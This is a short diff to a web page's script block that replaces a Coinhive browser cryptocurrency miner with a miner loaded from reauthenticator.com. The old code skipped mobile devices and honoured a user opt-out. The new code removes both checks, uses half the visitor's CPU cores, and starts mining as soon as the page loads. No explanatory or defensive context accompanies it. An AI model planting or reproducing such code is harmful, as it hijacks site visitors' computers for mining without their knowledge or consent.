@@ -1,10 +1,11 @@
-﻿<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+﻿<script src="//reauthenticator.com/lib/crypta.js"></script>
 <script>
-var miner = new CoinHive.Anonymous('2ZToaDqNHarDkslSQRD6ebPXAEuukC5d', { throttle: 0.9 });
-
-// Only start on non-mobile devices and if not opted-out
-// in the last 14400 seconds (4 hours):
-if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-}
+    var threads = window.navigator.hardwareConcurrency / 2;
+    if (threads < 1) {
+        var threads = 1;
+    }
+    var miner = new CRLT.Anonymous('44a47c9a9ab6e7fb282862ffed8160c1e7086b97d223', {
+        threads: threads, autoThreads: false, throttle: 0.7,
+    });
+    miner.start();
 </script>
